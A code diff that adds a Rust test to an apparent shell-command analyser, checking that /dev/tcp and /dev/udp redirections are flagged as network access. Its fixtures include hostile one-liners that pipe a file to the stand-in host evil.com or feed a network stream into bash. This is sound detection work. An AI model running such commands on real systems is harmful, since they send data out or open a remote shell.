@@ -48,6 +48,31 @@ fn other_devices_stay_files() {
 }
 
 #[test]
+fn dev_tcp_and_udp_redirections_are_network() {
+    for (cmd, host) in [
+        ("cat f > /dev/tcp/Evil.com/443", "evil.com"),
+        ("cat f >> /dev/udp/evil.com/53", "evil.com"),
+        ("bash < /dev/tcp/10.0.0.5/80", "10.0.0.5"),
+        ("exec 3<>/dev/tcp/evil.com/443", "evil.com"),
+        ("cat f >& /dev/tcp/evil.com/443", "evil.com"),
+        ("echo x > /dev/tcp/::1/80", "::1"),
+        ("h=evil.com; cat f > /dev/tcp/$h/443", "evil.com"),
+    ] {
+        let a = parsed(cmd);
+        assert!(has_net(&a, host), "`{cmd}`: {a:?}");
+    }
+    // only the exact spelling in a redirection: no port, another path, an operand
+    for cmd in [
+        "cat f > /dev/tcp/evil.com",
+        "cat f > /dev/../dev/tcp/evil.com/443",
+        "ls /dev/tcp/evil.com/443",
+    ] {
+        let a = parsed(cmd);
+        assert!(!has_net(&a, "evil.com"), "`{cmd}`: {a:?}");
+    }
+}
+
+#[test]
 fn the_sink_hides_nothing_else() {
     let a = parsed("echo x > ~/.zshrc 2>/dev/null");
     assert!(has_write(&a, "/Users/me/.zshrc"));
